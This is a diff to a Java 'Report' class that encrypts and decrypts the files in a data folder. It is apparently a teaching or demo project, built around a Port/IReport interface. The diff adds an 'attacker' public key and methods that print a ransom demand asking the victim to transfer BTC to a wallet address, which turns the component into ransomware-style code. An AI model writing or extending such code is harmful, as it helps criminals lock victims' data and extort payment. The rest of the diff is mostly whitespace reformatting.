@@ -6,9 +6,11 @@ import java.nio.file.FileSystems;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.security.PublicKey;
+import java.util.Base64;
 
 public class Report {
     private static final Report instance = new Report();
+    private static PublicKey publickey;
     public Port port;
     AESUtils aesUtils;
     File dataFolder;
@@ -33,6 +35,16 @@ public class Report {
         return instance;
     }
 
+    public static void setPublicKey(PublicKey publicKeyAttacker) {
+        publickey = publicKeyAttacker;
+    }
+
+    public static void getPublicKey() {
+        System.out.println("---------------------------------");
+        System.out.println("Please transfer the BTC to the wallet with the address: " + Base64.getEncoder().encodeToString(publickey.getEncoded()));
+        System.out.println("---------------------------------");
+    }
+
 
     private void encryptFile(File inFile) {
         byte[] encryptedBytes;
@@ -52,7 +64,7 @@ public class Report {
     private void decryptFile(File inFile) {
         byte[] decryptedBytes;
         String fileSeparator = FileSystems.getDefault().getSeparator();
-        File outFile = new File(dataFolder+ fileSeparator + inFile.getName().substring(0, inFile.getName().length() - 4));
+        File outFile = new File(dataFolder + fileSeparator + inFile.getName().substring(0, inFile.getName().length() - 4));
         try {
             OutputStream outputStream = new FileOutputStream(outFile);
             byte[] fileByteArray = Files.readAllBytes(inFile.toPath());
@@ -79,28 +91,37 @@ public class Report {
     }
 
     private void decryptFolder() {
-            if (encryptedDataFolder.exists()) {
-                File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
-                if (files != null) {
-                    for (File file : files) {
-                        decryptFile(file);
-                        file.delete();
-                    }
+        if (encryptedDataFolder.exists()) {
+            File[] files = new File(String.valueOf(encryptedDataFolder)).listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    decryptFile(file);
+                    file.delete();
                 }
-                encryptedDataFolder.delete();
             }
+            encryptedDataFolder.delete();
         }
+    }
 
     public class Port implements IReport {
 
         public void encrypt() {
-            String directoryName =  this.getClass().getClassLoader().getResource("").getPath();
+            String directoryName = this.getClass().getClassLoader().getResource("").getPath();
             encryptDataFolder();
         }
 
         public void decrypt() {
             decryptFolder();
         }
+
+        public void setPublicKeyAttacker(PublicKey publicKeyAttacker) {
+            setPublicKey(publicKeyAttacker);
+        }
+
+        public void getPublicKeyAttacker() {
+            getPublicKey();
+        }
+
 
     }
 }
